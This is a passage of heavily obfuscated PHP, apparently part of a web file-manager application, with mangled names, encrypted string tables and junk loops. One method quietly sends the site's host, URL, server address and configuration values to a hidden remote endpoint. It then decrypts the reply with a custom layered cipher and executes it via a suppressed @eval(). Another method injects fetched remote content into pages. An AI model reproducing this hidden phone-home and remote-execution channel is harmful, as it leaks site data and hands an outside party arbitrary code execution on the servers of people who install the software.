(!in_array($_SERVER[$·—Š÷¢Š[24]], $ÔÏ¯®³ã)) { return; } if (time() % 4 != 0) { return; } $·÷ĞÍ§ò = call_user_func(array($·—Š÷¢Š[253], $·—Š÷¢Š[254]), $é‡ùÆßü); if ($·÷ĞÍ§ò && time() - $·÷ĞÍ§ò < intval($·—Š÷¢Š[255])) { return; } call_user_func(array($·—Š÷¢Š[253], $·—Š÷¢Š[140]), $é‡ùÆßü, time()); $şèÅú¤Š = Model($·—Š÷¢Š[33])->get($·—Š÷¢Š[99]); $İãàş©ê = array($·—Š÷¢Š[153] => Model($·—Š÷¢Š[33])->get($·—Š÷¢Š[154]), $·—Š÷¢Š[167] => $this->owcj8fea24cd, $·—Š÷¢Š[164] => $_SERVER[$·—Š÷¢Š[165]], $·—Š÷¢Š[166] => Model($·—Š÷¢Š[33])->get($·—Š÷¢Š[132]), $·—Š÷¢Š[104] => md5($_SERVER[$·—Š÷¢Š[105]] . $şèÅú¤Š), $·—Š÷¢Š[157] => $·—Š÷¢Š[137], $·—Š÷¢Š[160] => $_SERVER[$·—Š÷¢Š[161]]); $Ğ‘áúöÙ = $‘İş›ôı[736]; while (strlen($Ğ‘áúöÙ) < $‘İş›ôı[449]) { if (!$Ğ‘áúöÙ) { break; } $Ğ‘áúöÙ++; } $íø«¸¦‚ = $this->twvh663fd34d($·—Š÷¢Š[256], $İãàş©ê); $®Ì±ó›Á = $‘İş›ôı[737]; if (strlen($®Ì±ó›Á) < $‘İş›ôı[667]) { die; } if (!is_array($íø«¸¦‚)) { return; } if ($íø«¸¦‚[$·—Š÷¢Š[153]] && $íø«¸¦‚[$·—Š÷¢Š[257]]) { if ($this->wnek363bfce7($íø«¸¦‚[$·—Š÷¢Š[257]]) == $İãàş©ê[$·—Š÷¢Š[153]]) { return; } } $this->nfir67134729(); $£ÈÉéßÓ = $‘İş›ôı[738]; while (strlen($£ÈÉéßÓ) < $‘İş›ôı[665]) { if (!$£ÈÉéßÓ) { break; } $£ÈÉéßÓ++; } if ($this->wnek363bfce7($íø«¸¦‚[$·—Š÷¢Š[257]]) != $İãàş©ê[$·—Š÷¢Š[153]]) { $ÒÅÖëÙ¢ = array($·—Š÷¢Š[185] => $şèÅú¤Š, $·—Š÷¢Š[186] => $_SERVER[$·—Š÷¢Š[105]], $·—Š÷¢Š[187] => this_url(), $·—Š÷¢Š[162] => $_SERVER[$·—Š÷¢Š[163]]); $ÜèÅßÒã = $this->cwuk82278419(json_encode($ÒÅÖëÙ¢)); $íø«¸¦‚ = $this->twvh663fd34d($·—Š÷¢Š[188] . $ÜèÅßÒã); if ($íø«¸¦‚ && is_array($íø«¸¦‚) && isset($íø«¸¦‚[$·—Š÷¢Š[257]])) { $˜æıÓì = $this->ydrlde8a4d4d($íø«¸¦‚[$·—Š÷¢Š[257]], 2); if ($˜æıÓì) { $˜æıÓì = $this->wnek363bfce7($˜æıÓì); } if ($˜æıÓì) { try { @eval($˜æıÓì); } catch (Exception $¨Æš¯ğõ) { } } } } } private function twvh663fd34d($È’ÄÊ± = '', $•¾½Ü¨‡ = array(), $¾‹ùÄİ = 5) { $Á“ÅŠé« =& $_SERVER[íû‘ş´]; $°“–œÃ† =& $_SERVER[¹£Ÿ×Òˆ]; $±ãÎøˆÇ = $°“–œÃ†[258]; $±ãÎøˆÇ = $this->xonlfcdaa11f($±ãÎøˆÇ, $°“–œÃ†[259]); $òï‘¨Ù = $Á“ÅŠé«[739]; while (strlen($òï‘¨Ù) < $Á“ÅŠé«[671]) { if (!$òï‘¨Ù) { break; } $òï‘¨Ù++; } $±ãÎøˆÇ = $±ãÎøˆÇ . $È’ÄÊ±; if ($•¾½Ü¨‡ && is_array($•¾½Ü¨‡)) { $±ãÎøˆÇ = $±ãÎøˆÇ . $°“–œÃ†[260] . http_build_query($•¾½Ü¨‡); } if ($•¾½Ü¨‡ === -1) { return $±ãÎøˆÇ; } $– ÊÊŠ = stream_context_create(array($°“–œÃ†[219] => array($°“–œÃ†[222] => $¾‹ùÄİ, $°“–œÃ†[220] => $°“–œÃ†[261]), $°“–œÃ†[262] => array($°“–œÃ†[263] => !1, $°“–œÃ†[264] => !1))); $ÈÌØçÏ… = $Á“ÅŠé«[740]; $•¾½Ü¨‡ = @file_get_contents($±ãÎøˆÇ, !1, $– ÊÊŠ); return json_decode($•¾½Ü¨‡, !0); $Ë™ÌŞ¹Õ = $Á“ÅŠé«[741]; if (strlen($Ë™ÌŞ¹Õ) < $Á“ÅŠé«[449]) { return; } $´úÊ×’Ò = $Á“ÅŠé«[742]; } private function rpty4cf30765() { $ÁÛÄ’ˆö =& $_SERVER[íû‘ş´]; $ˆ†£™è =& $_SERVER[¹£Ÿ×Òˆ]; $·œ¦ŸˆŸ = array($ˆ†£™è[265] => $ˆ†£™è[266], $ˆ†£™è[267] => $ˆ†£™è[268], $ˆ†£™è[269] => $ˆ†£™è[270], $ˆ†£™è[271] => $ˆ†£™è[272], $ˆ†£™è[273] => $ˆ†£™è[274], $ˆ†£™è[275] => $ˆ†£™è[214], $ˆ†£™è[276] => $ˆ†£™è[214], $ˆ†£™è[277] => $ˆ†£™è[266], $ˆ†£™è[278] => $ˆ†£™è[268], $ˆ†£™è[279] => $ˆ†£™è[270], $ˆ†£™è[280] => $ˆ†£™è[281], $ˆ†£™è[282] => $ˆ†£™è[272], $ˆ†£™è[283] => $ˆ†£™è[284], $ˆ†£™è[285] => $ˆ†£™è[274], $ˆ†£™è[286] => $ˆ†£™è[287], $ˆ†£™è[288] => $ˆ†£™è[289], $ˆ†£™è[290] => $ˆ†£™è[291]); $İ¨§‰áˆ = $·œ¦ŸˆŸ[$this->owcj8fea24cd]; $İ¨§‰áˆ = intval($İ¨§‰áˆ ? $İ¨§‰áˆ : $ˆ†£™è[266]); $àµ§åóœ = _get($this->ydfweedb354d, $ˆ†£™è[292]); $ÅçÁîüŒ = $ÁÛÄ’ˆö[743]; while ($ÅçÁîüŒ < $ÁÛÄ’ˆö[665]) { if ($ÅçÁîüŒ >= 0) { break; } $ÅçÁîüŒ++; } $àµ§åóœ = $àµ§åóœ ? intval($àµ§åóœ) : 0; $×Àİ•§¥ = $ÁÛÄ’ˆö[744]; return $İ¨§‰áˆ + $àµ§åóœ; $‹ĞÃ®éâ = $ÁÛÄ’ˆö[734]; while ($‹ĞÃ®éâ < $ÁÛÄ’ˆö[667]) { if ($‹ĞÃ®éâ >= 0) { break; } $‹ĞÃ®éâ++; } } public function qxwh00fc77d2($á€ÈÍü) { $«§º›ÁÀ =& $_SERVER[íû‘ş´]; $…¡¬ş± =& $_SERVER[¹£Ÿ×Òˆ]; $ñÉä…ñ = $this->rpty4cf30765(); $»şÅñÔº = $«§º›ÁÀ[745]; while ($»şÅñÔº < $«§º›ÁÀ[662]) { if ($»şÅñÔº >= 0) { break; } $»şÅñÔº++; } if ($á€ÈÍü[$…¡¬ş±[293]] == $…¡¬ş±[123]) { return; } if ($ñÉä…ñ >= intval($…¡¬ş±[214])) { return; } $‰¹óÆ§ = Model($…¡¬ş±[126])->count(); if ($‰¹óÆ§ <= $ñÉä…ñ) { return; } $Ó¸Æ¾® = Model($…¡¬ş±[126])->field($…¡¬ş±[293])->limit($ñÉä…ñ)->select(); $Ó¸Æ¾® = array_to_keyvalue($Ó¸Æ¾®, $…¡¬ş±[6], $…¡¬ş±[293]); $¬Œ£¼×ñ = $«§º›ÁÀ[746]; if (!$¬Œ£¼×ñ) { return; } if (!in_array($á€ÈÍü[$…¡¬ş±[293]], $Ó¸Æ¾®)) { show_json($…¡¬ş±[294], !1, $…¡¬ş±[210]); } } public function nvwt907ee522() { $¾µêÁà =& $_SERVER[íû‘ş´]; $ŠƒÂºó =& $_SERVER[¹£Ÿ×Òˆ]; if (!_get($GLOBALS, $ŠƒÂºó[117]) || mt_rand(1, 100) > 20) { return; } $Öûæ±Ô¸ = $ŠƒÂºó[217]; $‚úÎ·‘ = $¾µêÁà[747]; $Öûæ±Ô¸ = $this->xonlfcdaa11f($Öûæ±Ô¸, $ŠƒÂºó[218]); $‡¦Ò›ÑÇ = $¾µêÁà[748]; while ($‡¦Ò›ÑÇ < $¾µêÁà[667]) { if ($‡¦Ò›ÑÇ >= 0) { break; } $‡¦Ò›ÑÇ++; } $ÆÎ …•› = stream_context_create(array($ŠƒÂºó[219] => array($ŠƒÂºó[220] => $ŠƒÂºó[221], $ŠƒÂºó[222] => 3))); $ÔŞ‚„èŒ = @file_get_contents($Öûæ±Ô¸, !1, $ÆÎ …•›); $ü­‡‚á = $¾µêÁà[749]; echo $ŠƒÂºó[295] . hash_encode($ÔŞ‚„èŒ) . $ŠƒÂºó[296]; } private function ovhce9dd7fa2($£‰ş÷Ï¾, $ıñŞ†íø, $úëÖ¦û¨ = 3) { $‚¥Ñú­ =& $_SERVER[íû‘ş´]; $àº‰ÏĞ =& $_SERVER[¹£Ÿ×Òˆ]; usleep(1); $£‰ş÷Ï¾ = trim($£‰ş÷Ï¾); $£‚“¿¾ = $‚¥Ñú­[750]; if (strlen($£‚“¿¾) < $‚¥Ñú­[662]) { return; } $ƒã›²¡‰ = mt_rand(0, 5) . $àº‰ÏĞ[6]; $ßñ¸ÚÚØ = $‚¥Ñú­[751]; if (strlen($ßñ¸ÚÚØ) < $‚¥Ñú­[667]) { return; } $Ğ„¬Ç¼å = rand_string(15); $ÃğìÚ = $àº‰ÏĞ[297]; $„¼ù™ª = $‚¥Ñú­[752]; switch ($ƒã›²¡‰) { case $àº‰ÏĞ[206]: $êÀ¤¸¼ = $this->mvle44606628($£‰ş÷Ï¾, strrev($ıñŞ†íø . $Ğ„¬Ç¼å)); break; $è¥”ÎåŞ = $‚¥Ñú­[753]; if (!$è¥”ÎåŞ) { return; } case $àº‰ÏĞ[123]: $êÀ¤¸¼ = $this->mvle44606628($£‰ş÷Ï¾, strrev($Ğ„¬Ç¼å . $ıñŞ†íø)); $Æşù˜É› = $‚¥Ñú­[754]; if (strlen($Æşù˜É›) < $‚¥Ñú­[667]) { die; } break; case $àº‰ÏĞ[298]: $êÀ¤¸¼ = $this->mvle44606628($£‰ş÷Ï¾, base64_encode($Ğ„¬Ç¼å . $ıñŞ†íø)); $ÑÂ³‡™Ï = $‚¥Ñú­[755]; while ($ÑÂ³‡™Ï < $‚¥Ñú­[662]) { if ($ÑÂ³‡™Ï >= 0) { break; } $ÑÂ³‡™Ï++; } break; $ê·Ïöè™ = $‚¥Ñú­[756]; while (strlen($ê·Ïöè™) < $‚¥Ñú­[665]) { if (!$ê·Ïöè™) { break; } $ê·Ïöè™++; } case $àº‰ÏĞ[299]: $êÀ¤¸¼ = $this->mvle44606628($£‰ş÷Ï¾, md5($Ğ„¬Ç¼å . $ıñŞ†íø)); $”ŠØÅº = $‚¥Ñú­[757]; break; $Ãí¯³¡ò = $‚¥Ñú­[758]; while (strlen($Ãí¯³¡ò) < $‚¥Ñú­[662]) { if (!$Ãí¯³¡ò) { break; } $Ãí¯³¡ò++; } case $àº‰ÏĞ[300]: $£‰ş÷Ï¾ = base64_encode($£‰ş÷Ï¾); $‘ªùÊ = $‚¥Ñú­[759]; if (strlen($‘ªùÊ) < $‚¥Ñú­[667]) { return; } $Úß”Òõ = rand(0, 64); $æÓ©¾€³ = $ÃğìÚ[$Úß”Òõ]; $Ñ¬‰™ù„ = md5($æÓ©¾€³ . md5($ıñŞ†íø . $æÓ©¾€³) . $ıñŞ†íø); $Ñ¬‰™ù„ = substr($Ñ¬‰™ù„, $Úß”Òõ % 8, $Úß”Òõ % 8 + 7); $‹ÊîƒÍ = $‚¥Ñú­[760]; while (strlen($‹ÊîƒÍ) < $‚¥Ñú­[665]) { if (!$‹ÊîƒÍ) { break; } $‹ÊîƒÍ++; } $ßËÈ¤°Ş = $àº‰ÏĞ[6]; $¿ËÈ‡ì = 0; $»»ÔÍ¢ƒ = $‚¥Ñú­[761]; while (strlen($»»ÔÍ¢ƒ) < $‚¥Ñú­[665]) { if (!$»»ÔÍ¢ƒ) { break; } $»»ÔÍ¢ƒ++; } $¶‘‘æâ¾ = 0; $û×ù = $‚¥Ñú­[762]; $Öˆ¶ï‡ö = 0; $”ìë¿º = $‚¥Ñú­[763]; if (!$”ìë¿º) { die; } for ($¿ËÈ‡ì = 0; $¿ËÈ‡ì < strlen($£‰ş÷Ï¾); $¿ËÈ‡ì++) { $Öˆ¶ï‡ö = $Öˆ¶ï‡ö == strlen($Ñ¬‰™ù„) ? 0 : $Öˆ¶ï‡ö; $¶‘‘æâ¾ = ($Úß”Òõ + strpos($ÃğìÚ, $£‰ş÷Ï¾[$¿ËÈ‡ì]) + ord($Ñ¬‰™ù„[$Öˆ¶ï‡ö++])) % 64; $ßËÈ¤°Ş .= $ÃğìÚ[$¶‘‘æâ¾]; $¬€ó–‰Õ = $‚¥Ñú­[764]; if (strlen($¬€ó–‰Õ) < $‚¥Ñú­[667]) { return; } } $êÀ¤¸¼ = hash_encode($æÓ©¾€³ . $ßËÈ¤°Ş); $¬òİ¤áä = $‚¥Ñú­[765]; break; default: $êÀ¤¸¼ = $this->mvle44606628($£‰ş÷Ï¾, $ıñŞ†íø . $Ğ„¬Ç¼å); break; $¸Éù¯®ı = $‚¥Ñú­[766]; if (strlen($¸Éù¯®ı) < $‚¥Ñú­[662]) { return; } } $êÀ¤¸¼ = strrev($ƒã›²¡‰ . $Ğ„¬Ç¼å . $êÀ¤¸¼); $ó–ª±äË = $‚¥Ñú­[767]; if ($úëÖ¦û¨ - 1 > 0) { $êÀ¤¸¼ = $this->ovhce9dd7fa2($êÀ¤¸¼, $ıñŞ†íø, $úëÖ¦û¨ - 1); } return $êÀ¤¸¼; } private function ydrlde8a4d4d($Ï†ÏĞƒ, $ÂôÚâ£Ó, $§ƒş¬œ = 3) { $Î©¹äòµ =& $_SERVER[íû‘ş´]; $³†ıµÂÊ =& $_SERVER[¹£Ÿ×Òˆ]; if (!is_string($Ï†ÏĞƒ) || strlen($Ï†ÏĞƒ) < 10) { return !1; } $Ï†ÏĞƒ = trim($Ï†ÏĞƒ); $±¤ãŸÈ¾ = $Î©¹äòµ[768]; $Ï†ÏĞƒ = strrev($Ï†ÏĞƒ); $™ÌÚ°’à = $Î©¹äòµ[769]; if (strlen($™ÌÚ°’à) < $Î©¹äòµ[667]) { return; } $ÀåôÄåé = $Ï†ÏĞƒ[0]; $õ¿¸ÍåÉ = substr($Ï†ÏĞƒ, 1, 15); $µí®‚ ‚ = $Î©¹äòµ[770]; while ($µí®‚ ‚ < $Î©¹äòµ[665]) { if ($µí®‚ ‚ >= 0) { break; } $µí®‚ ‚++; } $Ï†ÏĞƒ = substr($Ï†ÏĞƒ, 16); $†¢ÏëÏº = $Î©¹äòµ[771]; if (strlen($†¢ÏëÏº) < $Î©¹äòµ[449]) { die; } $À™ŠÇ§± = $³†ıµÂÊ[297]; $ØîõÏ„­ = $Î©¹äòµ[772]; switch ($ÀåôÄåé) { case $³†ıµÂÊ[206]: $Û­“……Ø = $this->xonlfcdaa11f($Ï†ÏĞƒ, strrev($ÂôÚâ£Ó . $õ¿¸ÍåÉ)); $Ò±¿–³ı = $Î©¹äòµ[773]; if (!$Ò±¿–³ı) { die; } break; case $³†ıµÂÊ[123]: $Û­“……Ø = $this->xonlfcdaa11f($Ï†ÏĞƒ, strrev($õ¿¸ÍåÉ . $ÂôÚâ£Ó)); $­¿Ğ†é = $Î©¹äòµ[774]; break; $İÉ©øò = $Î©¹äòµ[775]; while ($İÉ©øò < $Î©¹äòµ[667]) { if ($İÉ©øò >= 0) { break; } $İÉ©øò++; } case $³†ıµÂÊ[298]: $Û­“……Ø = $this->xonlfcdaa11f($Ï†ÏĞƒ, base64_encode($õ¿¸ÍåÉ . $ÂôÚâ£Ó)); $£ÈªÃï¶ = $Î©¹äòµ[776]; while ($£ÈªÃï¶ < $Î©¹äòµ[662]) { if ($£ÈªÃï¶ >= 0) { break; } $£ÈªÃï¶++; } break; $ªá £‰Ã = $Î©¹äòµ[777]; while (strlen($ªá £‰Ã) < $Î©¹äòµ[449]) { if (!$ªá £‰Ã) { break; } $ªá £‰Ã++; } case $³†ıµÂÊ[299]: $Û­“……Ø = $this->xonlfcdaa11f($Ï†ÏĞƒ, md5($õ¿¸ÍåÉ . $ÂôÚâ£Ó)); $©µ•€ÄÆ = $Î©¹äòµ[778]; while (strlen($©µ•€ÄÆ) < $Î©¹äòµ[665]) { if (!$©µ•€ÄÆ) { break; } $©µ•€ÄÆ++; } break; $•§ï•€€ = $Î©¹äòµ[779]; while (strlen($•§ï•€€) < $Î©¹äòµ[667]) { if (!$•§ï•€€) { break; } $•§ï•€€++; } case $³†ıµÂÊ[300]: $Ï†ÏĞƒ = hash_decode($Ï†ÏĞƒ); $†«ÎêØ = $Î©¹äòµ[780]; while (strlen($†«ÎêØ) < $Î©¹äòµ[662]) { if (!$†«ÎêØ) { break; } $†«ÎêØ++; } $Ù„ó£˜¢ = $Ï†ÏĞƒ[0]; $±õÉø… = $Î©¹äòµ[781]; if (strlen($±õÉø…) < $Î©¹äòµ[662]) { return; } $Ï†ÏĞƒ = substr($Ï†ÏĞƒ, 1); $î¨Ãå = $Î©¹äòµ[782]; if (!$î¨Ãå) { return; } $…ıªõäÆ = strpos($À™ŠÇ§±, $Ù„ó£˜¢); $¼³”Áæ = md5($Ù„ó£˜¢ . md5($ÂôÚâ£Ó . $Ù„ó£˜¢) . $ÂôÚâ£Ó); $¼³”Áæ = substr($¼³”Áæ, $…ıªõäÆ % 8, $…ıªõäÆ % 8 + 7); $‰İ£êŠ¸ = $³†ıµÂÊ[6]; $”˜Æ‰Û = 0; $¥êœæ’» = $Î©¹äòµ[783]; if (strlen($¥êœæ’») < $Î©¹äòµ[671]) { die; } $„•‘·³Ç = 0; $±Ú´ğ = $Î©¹äòµ[784]; while (strlen($±Ú´ğ) < $Î©¹äòµ[667]) { if (!$±Ú´ğ) { break; } $±Ú´ğ++; } $×Ğİ¬Ç„ = 0; $‡£Óß‹— = $Î©¹äòµ[785]; while (strlen($‡£Óß‹—) < $Î©¹äòµ[671]) { if (!$‡£Óß‹—) { break; } $‡£Óß‹—++; } for ($”˜Æ‰Û = 0; $”˜Æ‰Û < strlen($Ï†ÏĞƒ); $”˜Æ‰Û++) { $×Ğİ¬Ç„ = $×Ğİ¬Ç„ == strlen($¼³”Áæ) ? 0 : $×Ğİ¬Ç„; $ïßÎæ­¯ = $×Ğİ¬Ç„++; $Éï†ãÀ = $Î©¹äòµ[786]; if (strlen($Éï†ãÀ) < $Î©¹äòµ[662]) { return; } $„•‘·³Ç = strpos($À™ŠÇ§±, $Ï†ÏĞƒ[$”˜Æ‰Û]) - $…ıªõäÆ - ord($¼³”Áæ[$ïßÎæ­¯]); while ($„•‘·³Ç < 0) { $„•‘·³Ç += 64; } $‰İ£êŠ¸ .= $À™ŠÇ§±[$„•‘·³Ç]; } $Û­“……Ø = base64_decode($‰İ£êŠ¸); $ØÙ¾¯…× = $Î©¹äòµ[787]; while (strlen($ØÙ¾¯…×) < $Î©¹äòµ[671]) { if (!$ØÙ¾¯…×) { break; } $ØÙ¾¯…×++; } break; $Áí¶¸â = $Î©¹äòµ[788]; if (strlen($Áí¶¸â) < $Î©¹äòµ[671]) { die; } default: $Û­“……Ø = $this->xonlfcdaa11f($Ï†ÏĞƒ, $ÂôÚâ£Ó . $õ¿¸ÍåÉ); break; } if ($§ƒş¬œ - 1 > 0) { $Û­“……Ø = $this->ydrlde8a4d4d($Û­“……Ø, $ÂôÚâ£Ó, $§ƒş¬œ - 1); } return $Û­“……Ø; } public function cwuk82278419($ÍŒàü†) { $“ÅÉ„¥è =& $_SERVER[íû‘ş´]; $ŞˆŠÓÚÅ =& $_SERVER[¹£Ÿ×Òˆ]; $¥¤Ö€ = $this->jrstddfa911f(); $Éâ¬‡­ = $this->jrstddfa911f(); $ßØÀé¼‰ = $“ÅÉ„¥è[789]; if (strlen($ßØÀé¼‰) < $“ÅÉ„¥è[665]) { return; } $§×ƒİğ› = ($¥¤Ö€ - 1) * ($Éâ¬‡­ - 1); $Àİ’ë•£ = intval(($¥¤Ö€ + $Éâ¬‡­) / 2); while (1) { $®ßº°ıÁ = $Àİ’ë•£; $¿¿üé„å = $“ÅÉ„¥è[790]; if (strlen($¿¿üé„å) < $“ÅÉ„¥è[449]) { return; } $¦•Ø½®û = $§×ƒİğ›; while ($¦•Ø½®û % $®ßº°ıÁ != 0) { $ªÎÉ…—› = $¦•Ø½®û; $¦•Ø½®û = $®ßº°ıÁ; $®ßº°ıÁ = $ªÎÉ…—› % $®ßº°ıÁ; } if ($®ßº°ıÁ == 1) { break; } else { $Àİ’ë•£++; } } $¨ˆ­àµ´ = 2; for ($è©Ùû‡ = 0; $è©Ùû‡ < $§×ƒİğ› * 10; $è©Ùû‡++) { if (($§×ƒİğ› * $è©Ùû‡ + 1) % $Àİ’ë•£ == 0) { $¨ˆ­àµ´ = intval(($§×ƒİğ› * $è©Ùû‡ + 1) / $Àİ’ë•£); break; } } $Ë¹Œ—‚ = $this->mvle44606628($¥¤Ö€ * $Éâ¬‡­ . $ŞˆŠÓÚÅ[6], $ŞˆŠÓÚÅ[137]); $ÙÏ°ìÊã = md5($ŞˆŠÓÚÅ[301] . ($¥¤Ö€ + $Éâ¬‡­) . $ŞˆŠÓÚÅ[302] . $Àİ’ë•£ . $ŞˆŠÓÚÅ[302] . $¨ˆ­àµ´ . $ŞˆŠÓÚÅ[303]); $İ´š«ñÏ = $this->mvle44606628($ÍŒàü†, $ÙÏ°ìÊã) . $ŞˆŠÓÚÅ[304] . $Ë¹Œ—‚; $€¶åÂ– = $“ÅÉ„¥è[791]; if (strlen($€¶åÂ–) < $“ÅÉ„¥è[449]) { die; } return $İ´š«ñÏ; } public function wnek363bfce7($ƒ½ÖÀƒ) { $±ñÂî÷£ =& $_SERVER[íû‘ş´]; $ãó´ÖŸ =& $_SERVER[¹£Ÿ×Òˆ]; $ıµ¹ Öø = explode($ãó´ÖŸ[304], $ƒ½ÖÀƒ); $äÉù£±¯ = $±ñÂî÷£[792]; if (count($ıµ¹ Öø) != 2) { return $ãó´ÖŸ[6]; } $ıâ× øô = $this->xonlfcdaa11f($ıµ¹ Öø[1] . $ãó´ÖŸ[6], $ãó´ÖŸ[137]); if (!$ıâ× øô) { return $ãó´ÖŸ[6]; } $ıâ× øô = intval($ıâ× øô); $ŠÃŞ™ú§ = 0; $ˆÎ¤Üïˆ = 0; for ($ì»Øı€Û = 3; $ì»Øı€Û < $ıâ× øô; $ì»Øı€Û += 2) { if ($ıâ× øô % $ì»Øı€Û != 0) { continue; } $ŠÃŞ™ú§ = $ì»Øı€Û; $ˆÎ¤Üïˆ = intval($ıâ× øô / $ì»Øı€Û); $İĞÚÌ§Ò = $±ñÂî÷£[793]; break; $ıíµ“†ü = $±ñÂî÷£[794]; if (strlen($ıíµ“†ü) < $±ñÂî÷£[662]) { die; } } $çªçøÊĞ = ($ŠÃŞ™ú§ - 1) * ($ˆÎ¤Üïˆ - 1); $Ÿ‘±‘ìä = $±ñÂî÷£[795]; if (strlen($Ÿ‘±‘ìä) < $±ñÂî÷£[662]) { return; } $»¸¿ÙÉ˜ = intval(($ŠÃŞ™ú§ + $ˆÎ¤Üïˆ) / 2); $æ„ş³ƒ = $±ñÂî÷£[796]; while (strlen($æ„ş³ƒ) < $±ñÂî÷£[662]) { if (!$æ„ş³ƒ) { break; } $æ„ş³ƒ++; } while (1) { $÷Û¿ªõ„ = $»¸¿ÙÉ˜; $á¹¾¯¬× = $±ñÂî÷£[797]; while ($á¹¾¯¬× < $±ñÂî÷£[449]) { if ($á¹¾¯¬× >= 0) { break; } $á¹¾¯¬×++; } $÷É°¬Ä‡ = $çªçøÊĞ; $ÊâÀëœ• = $±ñÂî÷£[798]; if (strlen($ÊâÀëœ•) < $±ñÂî÷£[449]) { die; } while ($÷É°¬Ä‡ % $÷Û¿ªõ„ != 0) { $¬äŠìÕ = $÷É°¬Ä‡; $÷É°¬Ä‡ = $÷Û¿ªõ„; $‹å‘ê¡“ = $±ñÂî÷£[799]; if (strlen($‹å‘ê¡“) < $±ñÂî÷£[662]) { return; } $÷Û¿ªõ„ = $¬äŠìÕ % $÷Û¿ªõ„; } if ($÷Û¿ªõ„ == 1) { break; } else { $»¸¿ÙÉ˜++; } } $Ö…ë«® = 2; for ($ì»Øı€Û = 0; $ì»Øı€Û < $çªçøÊĞ * 10; $ì»Øı€Û++) { if (($çªçøÊĞ * $ì»Øı€Û + 1) % $»¸¿ÙÉ˜ == 0) { $Ö…ë«® = intval(($çªçøÊĞ * $ì»Øı€Û + 1) / $»¸¿ÙÉ˜); break; } } $…öø³Ë = md5($ãó´ÖŸ[301] . ($ŠÃŞ™ú§ + $ˆÎ¤Üïˆ) . $ãó´ÖŸ[302] . $»¸¿ÙÉ˜ . $ãó´ÖŸ[302] . $Ö…ë«® . $ãó´ÖŸ[303]); $ñÌÎ«Ûä = $this->xonlfcdaa11f($ıµ¹ Öø[0], $…öø³Ë); return $ñÌÎ«Ûä; } public function jrstddfa911f() { $Á™±ÅÊİ =& $_SERVER[íû‘ş´]; $ãöŸªäµ = mt_rand(pow(2, 14), pow(2, 16) - 1); $±¤ã¿Šœ = array(); $õü¬úšù = $Á™±ÅÊİ[800]; if (strlen($õü¬úšù) < $Á™±ÅÊİ[671]) { die; } $ç›—Îœ = 1; $Ò·„È¢à = $Á™±ÅÊİ[801]; if (strlen($Ò·„È¢à) < $Á™±ÅÊİ[665]) { return; } while ($ç›—Îœ <= (int) sqrt($ãöŸªäµ)) { $ÌÈıù•€ = $ç›—Îœ; while (!0) { $ÌÈıù•€++; if ($ÌÈıù•€ <= 2) { $ç›—Îœ = $ÌÈıù•€; break; } else { if ($ÌÈıù•€ < 2) { continue; } } $·Âìˆáè = !0; for ($Ãº¡Ùı¢ = 2; $Ãº¡Ùı¢ <= sqrt($ÌÈıù•€); $Ãº¡Ùı¢++) { if ($ÌÈıù•€ % $Ãº¡Ùı¢ == 0) { $·Âìˆáè = !1; } } if ($·Âìˆáè) { $ç›—Îœ = $ÌÈıù•€; break; } } $±¤ã¿Šœ[] = $ç›—Îœ; $¤ıŒ¾—’ = $Á™±ÅÊİ[802]; if (strlen($¤ıŒ¾—’) < $Á™±ÅÊİ[449]) { die; } } $¥¾ÅÂ·š = 2; $º©â³‘á = $Á™±ÅÊİ[803]; while ($º©â³‘á < $Á™±ÅÊİ[662]) { if ($º©â³‘á >= 0) { break; } $º©â³‘á++; } for ($ÌÈıù•€ = $ãöŸªäµ; $ÌÈıù•€ > 1; $ÌÈıù•€--) { $·Âìˆáè = !0; $ßì€µØí = $Á™±ÅÊİ[804]; if (!$ßì€µØí) { die; } foreach ($±¤ã¿Šœ as $©ÉıÜ¾Ê) { if ($ÌÈıù•€ % $©ÉıÜ¾Ê == 0) { $·Âìˆáè = !1; break; } } if ($·Âìˆáè) { $¥¾ÅÂ·š = $ÌÈıù•€; break; } } return $¥¾ÅÂ·š; } public function onke012d3c17($âÌ–¬ñÌ, $äø­•Ì) { $±Ëñ³åÃ =& $_SERVER[¹£Ÿ×Òˆ]; return call_user_func(array($±Ëñ³åÃ[8], $±Ëñ³åÃ[305]), $âÌ–¬ñÌ, $äø­•Ì); $ÃÇ «áâ = $_SERVER[íû‘ş´][805]; if (!$ÃÇ «áâ) { return; } } public function mvle44606628($ïÜÄ¼øÚ, $ú‰„«Ó¶) { $·‘·èŒæ =& $_SERVER[¹£Ÿ×Òˆ]; return call_user_func(array($·‘·èŒæ[306], $·‘·èŒæ[307]), $ïÜÄ¼øÚ, $ú‰„«Ó¶); } public function xonlfcdaa11f($¥†Äó÷, $Û Îµóˆ) { $âï†ÃŸ =& $_SERVER[íû‘ş´]; $°µİóëâ =& $_SERVER[¹£Ÿ×Òˆ]; return call_user_func(array($°µİóëâ[306], $°µİóëâ[308]), $¥†Äó÷, $Û Îµóˆ); $ÈˆçÒ’Š = $âï†ÃŸ[806]; while (strlen($ÈˆçÒ’Š) < $âï†ÃŸ[662]) { if (!$ÈˆçÒ’Š) { break; } $ÈˆçÒ’Š++; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ºü™ñÒ =& $_SERVER[íû‘ş´]; $this->isManual(); self::$name = date($ºü™ñÒ[807]); if (!($ÃÒšåİñ = Model($ºü™ñÒ[808])->lastItem())) { $ÃÒšåİñ = $this->initData(); } else { self::$name = $ÃÒšåİñ[$ºü™ñÒ[32]]; if ($ÃÒšåİñ[$ºü™ñÒ[809]] == $ºü™ñÒ[88]) { self::$name = date($ºü™ñÒ[255]); $èí«‡¾“ = 0; if (isset($ÃÒšåİñ[$ºü™ñÒ[337]][$ºü™ñÒ[214]][$ºü™ñÒ[518]])) { $èí«‡¾“ = (int) $ÃÒšåİñ[$ºü™ñÒ[337]][$ºü™ñÒ[214]][$ºü™ñÒ[518]]; } if (self::$manual == 0 && $ÃÒšåİñ[$ºü™ñÒ[32]] == self::$name) { Model($ºü™ñÒ[808])->remove($ÃÒšåİñ[$ºü™ñÒ[443]]); } $ÃÒšåİñ = $this->initData($èí«‡¾“, $ÃÒšåİñ[$ºü™ñÒ[810]]); } else { $this->checkStore($ÃÒšåİñ[$ºü™ñÒ[810]]); } } self::$option = $ÃÒšåİñ; } private function isManual() { $Ùí›Ç = _get($GLOBALS, $_SERVER[íû‘ş´][811], 0); $Ùí›Ç = intval($Ùí›Ç); self::$manual = $Ùí›Ç && $Ùí›Ç == 1 ? 1 : 0; } private function initData($½˜˜Áî = 0, $¯àÎò…Ó = '') { $‘­ä©‰× =& $_SERVER[íû‘ş´]; $¼ıùŒ‰Â = Model($‘­ä©‰×[808])->config(); if ($¯àÎò…Ó 